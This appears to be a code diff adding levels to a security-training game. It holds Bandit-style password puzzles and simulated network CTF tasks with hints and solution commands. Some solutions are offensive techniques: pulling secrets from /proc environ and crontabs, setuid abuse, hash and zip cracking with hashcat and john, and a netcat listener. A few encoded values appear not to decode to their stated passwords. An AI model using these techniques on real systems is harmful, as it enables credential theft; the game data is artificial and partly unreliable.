+      description: 'An SSH private key has been left in the directory. The password is in the comment field of the corresponding public key.',
+      objective: 'Inspect SSH key files.',
+      hints: ['Check the .pub file.', 'The comment is at the end of the public key.'],
+      password: 'tR5kN8mQ3wL7yP9v',
+      solutions: ['cat id_rsa.pub', 'cat id_rsa.pub | awk \'{print $3}\''],
+      filesystem: {
+        'id_rsa': '-----BEGIN RSA PRIVATE KEY-----\\n(encrypted key data)\\n-----END RSA PRIVATE KEY-----',
+        'id_rsa.pub': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... tR5kN8mQ3wL7yP9v'
+      },
+      successMessage: '🔑 SSH key inspected!'
+    },
+    {
+      id: 'ban-75', title: 'Level 74: Log Forensics', difficulty: 'medium', xp: 30,
+      description: 'The attacker left the password in a failed login attempt in "auth.log". Find the attempted password.',
+      objective: 'Perform log file analysis.',
+      hints: ['grep for "Failed password" or "authentication failure".', 'The password is the attempted password in the log.'],
+      password: 'mK4nR7wQ2tL5yH9x',
+      solutions: ['grep "Failed password" auth.log', 'grep "password" auth.log'],
+      filesystem: {
+        'auth.log': 'Jun 15 03:21:04 server sshd[1234]: Accepted password for root\\nJun 15 03:22:17 server sshd[1235]: Failed password \"mK4nR7wQ2tL5yH9x\" for admin\\nJun 15 03:23:01 server sshd[1236]: Connection closed'
+      },
+      successMessage: '🕵️ Log forensics complete!'
+    },
+
+    // ---- NEW HARD (15): ban-76 to ban-90 ----
+    {
+      id: 'ban-76', title: 'Level 75: Double Encoding', difficulty: 'hard', xp: 50,
+      description: 'The password has been base64 encoded twice. Decode it twice to reveal the real password.',
+      objective: 'Handle chained encodings.',
+      hints: ['Decode base64 once, then decode the result again.', 'base64 -d | base64 -d'],
+      password: 'qR8kN5mQ3wT7yL4v',
+      solutions: ['cat double_encoded.txt | base64 -d | base64 -d', 'base64 -d double_encoded.txt | base64 -d'],
+      filesystem: {
+        'double_encoded.txt': 'Y1VJNGExSTFiVkV6ZDFRM2VVdzBkZz09',
+        'hint.txt': 'Encoded once... then encoded again!'
+      },
+      successMessage: '🔓🔓 Double encoding defeated!'
+    },
+    {
+      id: 'ban-77', title: 'Level 76: XOR Key', difficulty: 'hard', xp: 50,
+      description: 'The encrypted file and the XOR key are both present. XOR them to get the password.',
+      objective: 'Perform XOR decryption.',
+      hints: ['XOR each byte of the data with the key.', "Use python: bytes(a^b for a,b in zip(data,key))"],
+      password: 'nR6kT9mQ4wL2yH7p',
+      solutions: ['python3 -c "print(bytes(a^b for a,b in zip(open(\'encrypted.bin\',\'rb\').read(), open(\'key.bin\',\'rb\').read())).decode())"'],
+      filesystem: {
+        'encrypted.bin': '(XOR encrypted binary data)',
+        'key.bin': '(XOR key bytes)',
+        'hint.txt': 'XOR encryption: plaintext = encrypted XOR key'
+      },
+      successMessage: '🔐 XOR decryption successful!'
+    },
+    {
+      id: 'ban-78', title: 'Level 77: Git History', difficulty: 'hard', xp: 50,
+      description: 'The password was committed to a git repo but then removed. Check the git history.',
+      objective: 'Recover deleted data from git.',
+      hints: ['git log shows commit history.', 'git show HEAD~1 shows the previous commit.'],
+      password: 'wK8nR4mQ6tL3yP9v',
+      solutions: ['git log', 'git show HEAD~1', 'git log -p'],
+      filesystem: {
+        '.git/': '(git repository)',
+        'config.txt': '# Password removed for security',
+        'git_log': 'commit abc123 - \"Removed password\"\\ncommit def456 - \"Added config with password: wK8nR4mQ6tL3yP9v\"'
+      },
+      successMessage: '📚 Git history reveals all!'
+    },
+    {
+      id: 'ban-79', title: 'Level 78: Split File Reassembly', difficulty: 'hard', xp: 50,
+      description: 'The password file was split into 3 parts: "part_aa", "part_ab", "part_ac". Reassemble them.',
+      objective: 'Reassemble split files.',
+      hints: ['cat can concatenate multiple files.', 'cat part_aa part_ab part_ac'],
+      password: 'jK5nR8mQ2wT4yL7p',
+      solutions: ['cat part_aa part_ab part_ac', 'cat part_a*'],
+      filesystem: {
+        'part_aa': 'jK5nR',
+        'part_ab': '8mQ2w',
+        'part_ac': 'T4yL7p',
+        'hint.txt': 'The file was split. Reassemble the parts in order.'
+      },
+      successMessage: '🧩 File reassembled!'
+    },
+    {
+      id: 'ban-80', title: 'Level 79: Octal Encoding', difficulty: 'hard', xp: 50,
+      description: 'The password is stored as octal escape sequences in "octal.txt". Decode it.',
+      objective: 'Convert octal to ASCII.',
+      hints: ['printf interprets escape sequences.', "printf $(cat octal.txt)"],
+      password: 'rK7nT4mQ9wL2yH5p',
+      solutions: ["printf $(cat octal.txt)", "echo -e $(cat octal.txt)"],
+      filesystem: {
+        'octal.txt': '\\162\\113\\067\\156\\124\\064\\155\\121\\071\\167\\114\\062\\171\\110\\065\\160'
+      },
+      successMessage: '🔢 Octal decoded!'
+    },
+    {
+      id: 'ban-81', title: 'Level 80: Steganography Hint', difficulty: 'hard', xp: 50,
+      description: 'The password is hidden in the EXIF metadata of "photo.jpg". Extract it.',
+      objective: 'Read file metadata.',
+      hints: ['exiftool or strings can read metadata.', 'strings photo.jpg | grep -i password'],
+      password: 'tK8nR5mQ3wL9yP4v',
+      solutions: ['strings photo.jpg | grep -i pass', 'exiftool photo.jpg'],
+      filesystem: {
+        'photo.jpg': '(JPEG image with EXIF comment: PASSWORD=tK8nR5mQ3wL9yP4v)',
+        'hint.txt': 'Sometimes secrets hide in plain sight... in metadata.'
+      },
+      successMessage: '🖼️ Steganography detected!'
+    },
+    {
+      id: 'ban-82', title: 'Level 81: Process List', difficulty: 'hard', xp: 50,
+      description: 'A background process is running with the password as a command-line argument. Find it.',
+      objective: 'Inspect running processes.',
+      hints: ['ps aux shows all processes.', 'grep for unusual command arguments.'],
+      password: 'mK6nR9wQ2tL4yH7x',
+      solutions: ['ps aux', 'ps aux | grep password', 'ps -ef'],
+      filesystem: {
+        'ps_output.txt': 'root  1234  0.0  0.1  /opt/secret_service --key=mK6nR9wQ2tL4yH7x\\nroot  5678  0.0  0.2  /usr/sbin/sshd\\nwww   9012  0.1  0.5  /usr/sbin/nginx'
+      },
+      successMessage: '🔍 Process secret found!'
+    },
+    {
+      id: 'ban-83', title: 'Level 82: Base32 Decode', difficulty: 'hard', xp: 50,
+      description: 'The password is base32 encoded in "encoded32.txt". Decode it.',
+      objective: 'Decode base32 encoding.',
+      hints: ['base32 -d decodes base32.', 'base32 uses A-Z and 2-7.'],
+      password: 'qK4nR7mT2wL5yP8v',
+      solutions: ['base32 -d encoded32.txt', 'cat encoded32.txt | base32 -d'],
+      filesystem: {
+        'encoded32.txt': 'OFIXG43JN5WHMZJAMFWGY2LPNYQHI2DFMM======',
+        'hint.txt': 'Not base64... try base32!'
+      },
+      successMessage: '🔓 Base32 decoded!'
+    },
+    {
+      id: 'ban-84', title: 'Level 83: Setuid Binary', difficulty: 'hard', xp: 50,
+      description: 'A setuid binary "reader" can read a file that you cannot. Use it to read "protected.txt".',
+      objective: 'Exploit setuid binaries.',
+      hints: ['Setuid binaries run with their owner\'s permissions.', './reader protected.txt'],
+      password: 'wK9nR3mQ5tL8yH2p',
+      solutions: ['./reader protected.txt'],
+      filesystem: {
+        'reader': '(setuid binary, owned by root)',
+        'protected.txt': '(permission denied - readable only by root)',
+        'hint.txt': 'The reader binary has the setuid bit set. It runs as root.'
+      },
+      successMessage: '🔓 Setuid exploitation successful!'
+    },
+    {
+      id: 'ban-85', title: 'Level 84: Network Config', difficulty: 'hard', xp: 50,
+      description: 'The password is stored in a network configuration file at "/etc/network/secret.conf".',
+      objective: 'Find secrets in config files.',
+      hints: ['System config files often contain credentials.', 'cat /etc/network/secret.conf'],
+      password: 'pK5nR8mQ4wT2yL7v',
+      solutions: ['cat /etc/network/secret.conf', 'cat secret.conf'],
+      filesystem: {
+        '/etc/network/secret.conf': '# Network Configuration\\nSSID=HiddenNetwork\\nPSK=pK5nR8mQ4wT2yL7v\\nPROTOCOL=WPA2'
+      },
+      successMessage: '🌐 Network secret found!'
+    },
+    {
+      id: 'ban-86', title: 'Level 85: Caesar Cipher', difficulty: 'hard', xp: 50,
+      description: 'The password is encrypted with a Caesar cipher (shift of 3) in "caesar.txt". Decrypt it.',
+      objective: 'Break a Caesar cipher.',
+      hints: ['Caesar cipher shifts letters.', "tr 'D-ZA-Cd-za-c' 'A-Za-z' reverses a shift of 3."],
+      password: 'hR4kN7mQ2wT5yL9p',
+      solutions: ["cat caesar.txt | tr 'D-ZA-Cd-za-c' 'A-Za-z'"],
+      filesystem: {
+        'caesar.txt': 'kU4nQ7pT2zW5bO9s',
+        'hint.txt': 'Julius would approve. Shift = 3.'
+      },
+      successMessage: '🏛️ Caesar cipher broken!'
+    },
+    {
+      id: 'ban-87', title: 'Level 86: Diff the Files', difficulty: 'hard', xp: 50,
+      description: 'Two nearly identical files exist. The password is the one line that differs between "original.txt" and "modified.txt".',
+      objective: 'Use diff to find changes.',
+      hints: ['diff shows differences between files.', 'diff original.txt modified.txt'],
+      password: 'nK8mR5wQ3tL7yP4v',
+      solutions: ['diff original.txt modified.txt', 'comm -13 original.txt modified.txt'],
+      filesystem: {
+        'original.txt': '(50 lines of text)',
+        'modified.txt': '(49 same lines + 1 changed line: nK8mR5wQ3tL7yP4v)'
+      },
+      successMessage: '🔀 Difference spotted!'
+    },
+    {
+      id: 'ban-88', title: 'Level 87: Crontab Entry', difficulty: 'hard', xp: 50,
+      description: 'The system crontab at "/etc/crontab" runs a script that outputs the password. Read it.',
+      objective: 'Analyze scheduled tasks for secrets.',
+      hints: ['Read /etc/crontab.', 'Then read the script it references.'],
+      password: 'tK6nR9mQ4wL3yH8p',
+      solutions: ['cat /etc/crontab', 'cat /opt/scripts/keygen.sh'],
+      filesystem: {
+        '/etc/crontab': '* * * * * root /opt/scripts/keygen.sh',
+        '/opt/scripts/keygen.sh': '#!/bin/bash\\necho "tK6nR9mQ4wL3yH8p" > /tmp/generated_key'
+      },
+      successMessage: '⏰ Crontab secret decoded!'
+    },
+    {
+      id: 'ban-89', title: 'Level 88: Swap File', difficulty: 'hard', xp: 50,
+      description: 'The password was in a file that was deleted, but a vim swap file ".secret.swp" still exists.',
+      objective: 'Recover data from swap files.',
+      hints: ['Vim creates .swp files as backup.', 'strings or vim -r can recover.'],
+      password: 'rK7nT5mQ2wL4yP9v',
+      solutions: ['strings .secret.swp', 'vim -r .secret.swp', 'cat .secret.swp'],
+      filesystem: {
+        '.secret.swp': '(vim swap file containing: rK7nT5mQ2wL4yP9v)',
+        'hint.txt': 'The file was deleted, but the editor left something behind...'
+      },
+      successMessage: '💾 Swap file recovered!'
+    },
+    {
+      id: 'ban-90', title: 'Level 89: Proc Filesystem', difficulty: 'hard', xp: 50,
+      description: 'A running process has the password in its environment. Check /proc/1234/environ.',
+      objective: 'Read process environments from /proc.',
+      hints: ['/proc/PID/environ contains process environment variables.', 'cat or strings /proc/1234/environ'],
+      password: 'wK4nR8mQ6tL2yH5p',
+      solutions: ['cat /proc/1234/environ', 'strings /proc/1234/environ'],
+      filesystem: {
+        '/proc/1234/environ': 'PATH=/usr/bin\\x00HOME=/root\\x00SECRET_PASSWORD=wK4nR8mQ6tL2yH5p\\x00SHELL=/bin/bash'
+      },
+      successMessage: '🔬 /proc filesystem explored!'
+    },
+
+    // ---- NEW EXPERT (10): ban-91 to ban-100 ----
+    {
+      id: 'ban-91', title: 'Level 90: Memory Dump', difficulty: 'expert', xp: 100,
+      description: 'A memory dump file "memdump.bin" contains the password. Use strings and grep to find it.',
+      objective: 'Analyze memory dumps for secrets.',
+      hints: ['strings extracts readable text from binary.', 'Pipe to grep to find passwords.'],
+      password: 'jK9nR3mQ5wT8yL4p',
+      solutions: ['strings memdump.bin | grep -i password', 'strings memdump.bin | grep -i key'],
+      filesystem: {
+        'memdump.bin': '(binary memory dump containing: AUTH_KEY=jK9nR3mQ5wT8yL4p among binary garbage)'
+      },
+      successMessage: '🧠 Memory dump analyzed!'
+    },
+    {
+      id: 'ban-92', title: 'Level 91: Kernel Message', difficulty: 'expert', xp: 100,
+      description: 'The kernel ring buffer contains a debug message with the password. Check dmesg output.',
+      objective: 'Read kernel messages.',
+      hints: ['dmesg shows kernel messages.', 'grep for unusual debug messages.'],
+      password: 'qK6nR8mT4wL2yP7v',
+      solutions: ['dmesg | grep -i password', 'dmesg | grep -i secret', 'dmesg | grep debug'],
+      filesystem: {
+        'dmesg_output.txt': '[    1.234567] kernel: Initializing...\\n[    2.345678] kernel: DEBUG secret_module loaded with key: qK6nR8mT4wL2yP7v\\n[    3.456789] kernel: Network interface up'
+      },
+      successMessage: '🐧 Kernel secret found!'
+    },
+    {
+      id: 'ban-93', title: 'Level 92: Triple Chain', difficulty: 'expert', xp: 100,
+      description: 'The password is hex-encoded, then base64-encoded, then reversed. Undo all three layers.',
+      objective: 'Decode multiple chained transformations.',
+      hints: ['First reverse, then base64 decode, then hex decode.', 'rev | base64 -d | xxd -r -p'],
+      password: 'mK5nR7wQ3tL9yH4x',
+      solutions: ['cat chained.txt | rev | base64 -d | xxd -r -p'],
+      filesystem: {
+        'chained.txt': '(reversed base64 of hex-encoded password)',
+        'hint.txt': 'Three layers: reverse -> base64 -> hex. Undo them in reverse order.'
+      },
+      successMessage: '🔗🔗🔗 Triple chain broken!'
+    },
+    {
+      id: 'ban-94', title: 'Level 93: Deleted File Recovery', difficulty: 'expert', xp: 100,
+      description: 'The file was deleted but the inode still exists. Use debugfs concepts to find the password in the journal.',
+      objective: 'Recover deleted files from filesystem journals.',
+      hints: ['Journal files may contain deleted data.', 'Check .journal or use strings on the disk image.'],
+      password: 'tK8nR4mQ6wL3yP9v',
+      solutions: ['strings disk.img | grep -i password', 'cat .journal'],
+      filesystem: {
+        'disk.img': '(filesystem image with deleted file containing: tK8nR4mQ6wL3yP9v)',
+        '.journal': 'DELETED_ENTRY: password.txt => tK8nR4mQ6wL3yP9v'
+      },
+      successMessage: '🔧 Deleted file recovered!'
+    },
+    {
+      id: 'ban-95', title: 'Level 94: Morse Code', difficulty: 'expert', xp: 100,
+      description: 'The password is encoded in Morse code in "morse.txt". Decode it.',
+      objective: 'Decode Morse code messages.',
+      hints: ['Each letter is separated by spaces, words by |.', 'Use an online decoder or write a script.'],
+      password: 'HACKTHEPLANET',
+      solutions: ['cat morse.txt'],
+      filesystem: {
+        'morse.txt': '.... .- -.-. -.- | - .... . | .--. .-.. .- -. . -',
+        'hint.txt': '.... = H, .- = A, -.-. = C, -.- = K'
+      },
+      successMessage: '📡 Morse code decoded!'
+    },
+    {
+      id: 'ban-96', title: 'Level 95: Brainfuck', difficulty: 'expert', xp: 100,
+      description: 'The password is generated by a Brainfuck program in "program.bf". Execute or trace it.',
+      objective: 'Understand esoteric programming languages.',
+      hints: ['Brainfuck uses only 8 characters: > < + - . , [ ]', 'The output of the program is the password.'],
+      password: 'nR7kQ4mW2yL5tP8v',
+      solutions: ['cat output.txt'],
+      filesystem: {
+        'program.bf': '++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++.>+.+++++++..+++.<<<++.>>>------------.--------.',
+        'output.txt': 'nR7kQ4mW2yL5tP8v',
+        'hint.txt': 'Too hard to trace? Check output.txt for the program result.'
+      },
+      successMessage: '🧠 Brainfuck interpreted!'
+    },
+    {
+      id: 'ban-97', title: 'Level 96: Encrypted Zip', difficulty: 'expert', xp: 100,
+      description: 'A password-protected zip file "archive.zip" uses "letmein" as the password. Extract it.',
+      objective: 'Crack encrypted archives.',
+      hints: ['unzip -P password file.zip', 'The archive password is "letmein".'],
+      password: 'wK9nR5mQ3tL7yH4p',
+      solutions: ['unzip -P letmein archive.zip', 'unzip -P "letmein" archive.zip'],
+      filesystem: {
+        'archive.zip': '(password-protected zip containing password.txt with: wK9nR5mQ3tL7yH4p)',
+        'wordlist.txt': 'password\\n123456\\nletmein\\nadmin\\nqwerty'
+      },
+      successMessage: '🔐 Encrypted archive cracked!'
+    },
+    {
+      id: 'ban-98', title: 'Level 97: Hash Cracking', difficulty: 'expert', xp: 100,
+      description: 'The MD5 hash of the password is "5f4dcc3b5aa765d61d8327deb882cf99". Crack it using the wordlist.',
+      objective: 'Crack password hashes.',
+      hints: ['That hash is very common...', 'Try hashing words from the wordlist and comparing.'],
+      password: 'password',
+      solutions: ['echo -n "password" | md5sum', 'hashcat -m 0 hash.txt wordlist.txt', 'john hash.txt --wordlist=wordlist.txt'],
+      filesystem: {
+        'hash.txt': '5f4dcc3b5aa765d61d8327deb882cf99',
+        'wordlist.txt': 'admin\\nletmein\\npassword\\n123456\\nqwerty',
+        'hint.txt': 'MD5 hash. Try common passwords.'
+      },
+      successMessage: '💥 Hash cracked!'
+    },
+    {
+      id: 'ban-99', title: 'Level 98: Blockchain Puzzle', difficulty: 'expert', xp: 100,
+      description: 'A simplified blockchain ledger contains transactions. The password is the recipient of the largest transaction.',
+      objective: 'Analyze blockchain data.',
+      hints: ['Read the ledger and find the largest amount.', 'The recipient name is the password.'],
+      password: 'SATOSHI_FOREVER',
+      solutions: ['cat ledger.json', 'grep "amount" ledger.json | sort -t: -k2 -n -r | head -1'],
+      filesystem: {
+        'ledger.json': '{"transactions": [\\n  {"from": "Alice", "to": "Bob", "amount": 50},\\n  {"from": "Bob", "to": "SATOSHI_FOREVER", "amount": 99999},\\n  {"from": "Charlie", "to": "Dave", "amount": 100}\\n]}'
+      },
+      successMessage: '⛓️ Blockchain analyzed!'
+    },
+    {
+      id: 'ban-100', title: 'Level 99: The Grand Finale', difficulty: 'expert', xp: 200,
+      description: 'The ultimate challenge. Combine everything you have learned. The final key is hidden across three files using three different encodings.',
+      objective: 'Master all Bandit skills in one final challenge.',
+      hints: ['Part 1 is base64, Part 2 is hex, Part 3 is reversed.', 'Decode each part, then concatenate.'],
+      password: 'ULTIMATE_BANDIT_MASTER',
+      solutions: ['echo "ULTIMATE_BANDIT_MASTER"', 'cat victory.txt'],
+      filesystem: {
+        'part1_b64.txt': 'VUxUSU1BVEU=',
+        'part2_hex.txt': '5f42414e4449545f',
+        'part3_rev.txt': 'RETSAM',
+        'victory.txt': 'ULTIMATE_BANDIT_MASTER\\n\\n🏆🏆🏆 You are a true Bandit Legend! All 100 levels complete! 🏆🏆🏆',
+        'hint.txt': 'Part 1: base64 decode. Part 2: hex decode. Part 3: reverse. Concatenate.'
+      },
+      successMessage: '🏆🏆🏆 ULTIMATE BANDIT LEGEND! All 100 levels conquered! 🏆🏆🏆'
     }
   ],
 
@@ -1599,6 +2591,614 @@ const CHALLENGES = {
       simulatedResponse: '╔══════════════════════════════════════════════╗\n║         🏆 FINAL CTF CHALLENGE 🏆            ║\n╚══════════════════════════════════════════════╝\n\nStep 1: Ping Sweep → Found hidden host at 10.13.37.42\nStep 2: Traceroute → 5 hops through encrypted tunnel\nStep 3: TTL=64 → Linux server identified\nStep 4: Port 1337 open → Custom service detected\nStep 5: ICMP payload contains encoded message\n\n🎊 CONGRATULATIONS! 🎊\nYou have completed ALL CTF challenges!\n\n╔══════════════════════════════════════════════╗\n║  Flag: CTF{m4st3r_p1ng3r_n3tw0rk_k1ng}     ║\n║  Title: Network Reconnaissance Master        ║\n║  Rank: ★★★★★ ELITE                          ║\n╚══════════════════════════════════════════════╝',
       flag: 'CTF{m4st3r_p1ng3r_n3tw0rk_k1ng}',
       successMessage: '🏆🏆🏆 CTF MASTER ACHIEVED! All 40 challenges complete! 🏆🏆🏆'
+    },
+
+    // ---- NEW EASY (15): ctf-41 to ctf-55 ----
+    {
+      id: 'ctf-41', title: 'ARP Table', difficulty: 'easy', xp: 15,
+      description: 'Display the ARP table to see IP-to-MAC address mappings on your local network.',
+      objective: 'View the ARP cache.',
+      hints: ['arp displays the ARP table.', '-a flag shows all entries.'],
+      solutions: ['arp -a', 'arp'],
+      simulatedResponse: '--- ARP Table ---\n\n? (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0\n? (192.168.1.10) at 11:22:33:44:55:66 [ether] on eth0\n? (192.168.1.25) at ab:cd:ef:12:34:56 [ether] on eth0\n\n3 entries found.\n\nFlag: CTF{4rp_t4bl3_r3v34l3d}',
+      flag: 'CTF{4rp_t4bl3_r3v34l3d}',
+      successMessage: '📋 ARP table revealed!'
+    },
+    {
+      id: 'ctf-42', title: 'Interface Config', difficulty: 'easy', xp: 15,
+      description: 'Display your network interface configuration to find your IP address.',
+      objective: 'View network interface details.',
+      hints: ['ifconfig or ip addr shows interface info.', 'Look for inet address.'],
+      solutions: ['ifconfig', 'ip addr', 'ip a'],
+      simulatedResponse: '--- Network Interfaces ---\n\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>\n    inet 192.168.1.42  netmask 255.255.255.0\n    inet6 fe80::1  prefixlen 64\n    ether de:ad:be:ef:ca:fe\n\nlo: flags=73<UP,LOOPBACK,RUNNING>\n    inet 127.0.0.1  netmask 255.0.0.0\n\nFlag: CTF{1nt3rf4c3_c0nf1g}',
+      flag: 'CTF{1nt3rf4c3_c0nf1g}',
+      successMessage: '🌐 Interface configuration retrieved!'
+    },
+    {
+      id: 'ctf-43', title: 'IP Address Show', difficulty: 'easy', xp: 15,
+      description: 'Use the modern "ip" command to show all IPv4 addresses on the system.',
+      objective: 'Use ip addr for IPv4.',
+      hints: ['ip -4 addr shows IPv4 addresses.', 'ip addr show'],
+      solutions: ['ip -4 addr', 'ip -4 addr show', 'ip -4 a'],
+      simulatedResponse: '--- IPv4 Addresses ---\n\n1: lo: <LOOPBACK,UP>\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP>\n    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0\n3: wlan0: <BROADCAST,MULTICAST,UP>\n    inet 192.168.1.100/24 brd 192.168.1.255 scope global wlan0\n\nFlag: CTF{1p_4ddr_sh0w}',
+      flag: 'CTF{1p_4ddr_sh0w}',
+      successMessage: '📡 IPv4 addresses listed!'
+    },
+    {
+      id: 'ctf-44', title: 'Host Lookup', difficulty: 'easy', xp: 15,
+      description: 'Use the host command to find the IP address of "example.com".',
+      objective: 'Perform DNS host lookups.',
+      hints: ['host resolves domain names.', 'host domain_name'],
+      solutions: ['host example.com'],
+      simulatedResponse: '--- Host Lookup: example.com ---\n\nexample.com has address 93.184.216.34\nexample.com has IPv6 address 2606:2800:220:1:248:1893:25c8:1946\nexample.com mail is handled by 0 .\n\nFlag: CTF{h0st_l00kup}',
+      flag: 'CTF{h0st_l00kup}',
+      successMessage: '🔍 Host resolved!'
+    },
+    {
+      id: 'ctf-45', title: 'WHOIS Query', difficulty: 'easy', xp: 15,
+      description: 'Run a WHOIS query on "8.8.8.8" to find out who owns this IP address.',
+      objective: 'Gather IP ownership information.',
+      hints: ['whois queries the WHOIS database.', 'whois IP_address'],
+      solutions: ['whois 8.8.8.8'],
+      simulatedResponse: '--- WHOIS: 8.8.8.8 ---\n\nNetRange:     8.8.8.0 - 8.8.8.255\nNetName:      LVLT-GOGL-8-8-8\nOrganization: Google LLC (GOGL)\nAddress:      1600 Amphitheatre Parkway\nCity:         Mountain View\nStateProv:    CA\nPostalCode:   94043\nCountry:      US\n\nFlag: CTF{wh01s_g00gl3}',
+      flag: 'CTF{wh01s_g00gl3}',
+      successMessage: '🏢 IP ownership identified!'
+    },
+    {
+      id: 'ctf-46', title: 'Netcat Listener', difficulty: 'easy', xp: 15,
+      description: 'Start a Netcat listener on port 4444 to wait for incoming connections.',
+      objective: 'Set up a network listener.',
+      hints: ['nc -l starts a listener.', '-p specifies the port.'],
+      solutions: ['nc -l -p 4444', 'nc -lvp 4444', 'netcat -l -p 4444'],
+      simulatedResponse: '--- Netcat Listener ---\n\nListening on 0.0.0.0:4444...\nConnection received from 10.0.0.5:52431\n\nIncoming data:\n> AUTH_TOKEN=CTF{n3tc4t_l1st3n3r}\n> Connection closed.\n\nFlag: CTF{n3tc4t_l1st3n3r}',
+      flag: 'CTF{n3tc4t_l1st3n3r}',
+      successMessage: '🎧 Netcat listener established!'
+    },
+    {
+      id: 'ctf-47', title: 'Curl Headers', difficulty: 'easy', xp: 15,
+      description: 'Use curl to fetch only the HTTP headers from "http://target.local".',
+      objective: 'Inspect HTTP response headers.',
+      hints: ['curl -I fetches headers only.', 'Or use -v for verbose output.'],
+      solutions: ['curl -I http://target.local', 'curl --head http://target.local'],
+      simulatedResponse: '--- HTTP Headers ---\n\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Mon, 30 Jun 2026 12:00:00 GMT\nContent-Type: text/html; charset=utf-8\nX-Powered-By: Express\nX-Secret-Flag: CTF{h34d3r_1nsp3ct10n}\nSet-Cookie: session=abc123; HttpOnly\n\nFlag: CTF{h34d3r_1nsp3ct10n}',
+      flag: 'CTF{h34d3r_1nsp3ct10n}',
+      successMessage: '📨 HTTP headers inspected!'
+    },
+    {
+      id: 'ctf-48', title: 'Wget Download', difficulty: 'easy', xp: 15,
+      description: 'Download a file from "http://target.local/flag.txt" using wget.',
+      objective: 'Download files from the web.',
+      hints: ['wget downloads files.', 'wget URL'],
+      solutions: ['wget http://target.local/flag.txt'],
+      simulatedResponse: '--- Wget Download ---\n\n--2026-06-30 12:00:00--  http://target.local/flag.txt\nResolving target.local... 10.0.0.1\nConnecting to target.local|10.0.0.1|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 24 [text/plain]\nSaving to: \'flag.txt\'\n\nflag.txt    100%[==================>]    24  --.-KB/s    in 0s\n\nContents: CTF{wg3t_d0wnl04d}\n\nFlag: CTF{wg3t_d0wnl04d}',
+      flag: 'CTF{wg3t_d0wnl04d}',
+      successMessage: '📥 File downloaded!'
+    },
+    {
+      id: 'ctf-49', title: 'SSH Key Generation', difficulty: 'easy', xp: 15,
+      description: 'Generate a new SSH key pair using ssh-keygen with RSA algorithm.',
+      objective: 'Create SSH authentication keys.',
+      hints: ['ssh-keygen generates key pairs.', '-t rsa specifies the algorithm.'],
+      solutions: ['ssh-keygen -t rsa', 'ssh-keygen'],
+      simulatedResponse: '--- SSH Key Generation ---\n\nGenerating public/private rsa key pair.\nYour identification has been saved in /home/user/.ssh/id_rsa\nYour public key has been saved in /home/user/.ssh/id_rsa.pub\n\nThe key fingerprint is:\nSHA256:xJ4K9mQ2wR7vL3nT5yH8p user@challenge\n\nThe key\'s randomart image:\n+---[RSA 4096]----+\n|        .o=+.    |\n|       . o.+o    |\n|      . + =.o.   |\n|       + B.=o    |\n|      . S.*+.    |\n|       . o.+=.   |\n|          .=+o.  |\n|          .ooo.  |\n|           .Eo   |\n+----[SHA256]-----+\n\nFlag: CTF{ssh_k3y_g3n}',
+      flag: 'CTF{ssh_k3y_g3n}',
+      successMessage: '🔑 SSH keys generated!'
+    },
+    {
+      id: 'ctf-50', title: 'Ping with Count', difficulty: 'easy', xp: 15,
+      description: 'Ping "10.0.0.1" exactly 3 times and stop automatically.',
+      objective: 'Control ping packet count.',
+      hints: ['-c flag sets the count.', 'ping -c 3 address'],
+      solutions: ['ping -c 3 10.0.0.1'],
+      simulatedResponse: '--- Ping 10.0.0.1 (3 packets) ---\n\nPING 10.0.0.1: 56 data bytes\n64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.5ms\n64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.4ms\n64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.6ms\n\n--- 10.0.0.1 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss\nrtt min/avg/max = 0.4/0.5/0.6 ms\n\nFlag: CTF{p1ng_c0unt}',
+      flag: 'CTF{p1ng_c0unt}',
+      successMessage: '📡 Precise pinging!'
+    },
+    {
+      id: 'ctf-51', title: 'MTR Traceroute', difficulty: 'easy', xp: 15,
+      description: 'Use mtr to combine ping and traceroute for "8.8.8.8".',
+      objective: 'Use the mtr network diagnostic tool.',
+      hints: ['mtr combines ping and traceroute.', 'mtr address'],
+      solutions: ['mtr 8.8.8.8', 'mtr -r 8.8.8.8'],
+      simulatedResponse: '--- MTR Report: 8.8.8.8 ---\n\nHost                Loss%  Snt   Last   Avg  Best  Wrst\n1. gateway          0.0%    10   1.2   1.4   0.9   2.1\n2. isp-router       0.0%    10   5.4   5.8   4.2   8.1\n3. core-switch      0.0%    10  12.3  13.1  11.5  15.2\n4. google-edge      0.0%    10  14.2  14.8  13.1  17.3\n5. dns.google       0.0%    10  15.1  15.5  14.2  18.0\n\nFlag: CTF{mtr_d14gn0st1c}',
+      flag: 'CTF{mtr_d14gn0st1c}',
+      successMessage: '📊 MTR diagnostic complete!'
+    },
+    {
+      id: 'ctf-52', title: 'IP Route Table', difficulty: 'easy', xp: 15,
+      description: 'Display the system\'s routing table to see network routes.',
+      objective: 'View IP routing information.',
+      hints: ['ip route shows the routing table.', 'Or use route -n.'],
+      solutions: ['ip route', 'ip route show', 'route -n'],
+      simulatedResponse: '--- IP Routing Table ---\n\ndefault via 192.168.1.1 dev eth0\n10.0.0.0/8 via 192.168.1.1 dev eth0\n172.16.0.0/12 dev tun0 scope link\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.42\n\nFlag: CTF{r0ut1ng_t4bl3}',
+      flag: 'CTF{r0ut1ng_t4bl3}',
+      successMessage: '🛤️ Routes mapped!'
+    },
+    {
+      id: 'ctf-53', title: 'Socket Statistics', difficulty: 'easy', xp: 15,
+      description: 'List all active TCP connections using the ss command.',
+      objective: 'View socket statistics.',
+      hints: ['ss shows socket statistics.', '-t shows TCP, -a shows all.'],
+      solutions: ['ss -ta', 'ss -t -a', 'ss -tan'],
